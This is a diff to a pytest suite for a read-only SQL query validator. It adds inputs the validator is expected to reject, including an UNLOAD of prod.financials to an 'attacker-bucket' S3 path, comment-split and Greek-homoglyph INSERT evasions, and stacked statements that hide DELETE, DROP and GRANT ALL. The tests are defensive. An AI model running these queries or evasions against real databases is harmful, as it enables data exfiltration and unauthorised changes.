@@ -87,11 +87,14 @@ class TestQueryValidation:
             "INSERT INTO users VALUES (1, 'test')",
             "UPDATE users SET name = 'test' WHERE id = 1",
             'DELETE FROM users WHERE id = 1',
+            'MERGE INTO prod.dim_customer t USING staging.cust s ON (t.id=s.id) WHEN MATCHED THEN UPDATE SET name=s.name WHEN NOT MATCHED THEN INSERT (id,name) VALUES (s.id,s.name)',
             'TRUNCATE TABLE users',
             # DDL
             'CREATE TABLE test (id INT)',
+            "CREATE TABLE IF NOT EXISTS tmp.ctas_test WITH (format='PARQUET') AS SELECT * FROM prod.sales LIMIT 10",
             'DROP TABLE users',
             'ALTER TABLE users ADD COLUMN email VARCHAR(100)',
+            'ALTER TABLE prod.important RENAME TO prod.important_old',
             'CREATE DATABASE test_db',
             'DROP DATABASE test_db',
             # DML with UNION
@@ -103,9 +106,12 @@ class TestQueryValidation:
             'GRANT SELECT ON users TO role1',
             # Configuration changes
             'SET hive.exec.dynamic.partition = true',
+            'USE database_name',
             # TCL
             'COMMIT',
             'ROLLBACK',
+            # Data export/import
+            "UNLOAD ( SELECT * FROM prod.financials LIMIT 100 ) TO 's3://attacker-bucket/loot/' WITH (format='PARQUET')",
         ],
     )
     def test_non_read_only_queries_are_invalid(self, query):
@@ -125,6 +131,8 @@ class TestQueryValidation:
             'SELECT * FROM',  # Incomplete query
             'SELEC * FROM users',  # Typo
             'SELECT * FROM users WHERE',  # Incomplete WHERE
+            'IN/*hidden*/SERT INTO prod.audit(id) VALUES (1)',
+            'ΙNSERT INTO prod.tricky VALUES (1)',  # Unicode homoglyph: Greek Ι (iota) looks like Latin I
         ],
     )
     def test_invalid_sql_syntax(self, query):
@@ -159,6 +167,10 @@ class TestQueryValidation:
             'DESCRIBE users; SHOW TABLES',
             'EXPLAIN SELECT * FROM users; SELECT * FROM orders',
             'EXPLAIN ANALYZE SELECT 1; SELECT 2',
+            'SELECT 1; INSERT INTO prod.secret_log VALUES (42)',
+            'SELECT * FROM foo; DELETE FROM foo WHERE TRUE',
+            "SELECT ';DROP TABLE prod.users' AS harmless; INSERT INTO log VALUES (now())",
+            'CREATE VIEW sneaky AS SELECT * FROM prod.tiny; GRANT ALL ON prod.tiny TO PUBLIC',
         ],
     )
     def test_multiple_statements_rejected(self, query):
